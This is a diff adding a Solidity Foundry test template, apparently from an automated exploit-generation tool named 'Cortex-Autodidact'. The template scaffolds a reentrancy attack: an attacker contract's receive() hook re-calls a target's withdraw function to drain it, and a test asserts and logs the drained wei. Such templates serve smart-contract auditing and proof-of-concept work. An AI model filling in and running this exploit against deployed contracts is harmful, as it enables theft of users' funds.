@@ -1,0 +1,76 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.24;
+
+import "forge-std/Test.sol";
+
+/**
+ * ∴ CORTEX-AUTODIDACT STRIKE: Reentrancy
+ * Target: {{ target_name }}
+ * Generated: {{ timestamp }}
+ * Hypothesis: {{ hypothesis }}
+ */
+
+// --- Attacker Contract ---
+contract ReentrancyAttacker {
+    address public target;
+    uint256 public attackCount;
+    uint256 public maxDepth;
+
+    constructor(address _target, uint256 _maxDepth) {
+        target = _target;
+        maxDepth = _maxDepth;
+    }
+
+    function attack() external payable {
+        // Initial deposit + withdraw trigger
+        (bool ok,) = target.call{value: msg.value}(
+            abi.encodeWithSignature("{{ deposit_function }}")
+        );
+        require(ok, "deposit failed");
+
+        (bool ok2,) = target.call(
+            abi.encodeWithSignature("{{ withdraw_function }}")
+        );
+        require(ok2, "withdraw failed");
+    }
+
+    receive() external payable {
+        if (attackCount < maxDepth) {
+            attackCount++;
+            (bool ok,) = target.call(
+                abi.encodeWithSignature("{{ withdraw_function }}")
+            );
+            // Silently consume failure at max depth
+            ok;
+        }
+    }
+}
+
+contract ReentrancySTRIKE is Test {
+    // {{ target_contract_code }}
+
+    ReentrancyAttacker public attacker;
+
+    function setUp() public {
+        // Deploy target with initial funds
+        vm.deal(address(this), {{ initial_balance }});
+        // {{ setup_code }}
+    }
+
+    /// @notice Proves reentrancy drains funds beyond single withdrawal
+    function testExploit_Reentrancy() public {
+        uint256 targetBalBefore = address({{ target_address }}).balance;
+
+        // Fund attacker
+        vm.deal(address(attacker), {{ attack_amount }});
+
+        vm.prank(address(attacker));
+        attacker.attack{value: {{ attack_amount }}}();
+
+        uint256 targetBalAfter = address({{ target_address }}).balance;
+
+        // Reentrancy confirmed if target lost more than one withdrawal
+        assertLt(targetBalAfter, targetBalBefore, "EXPLOIT: Reentrancy drain confirmed");
+        emit log_named_uint("Drained (wei)", targetBalBefore - targetBalAfter);
+    }
+}
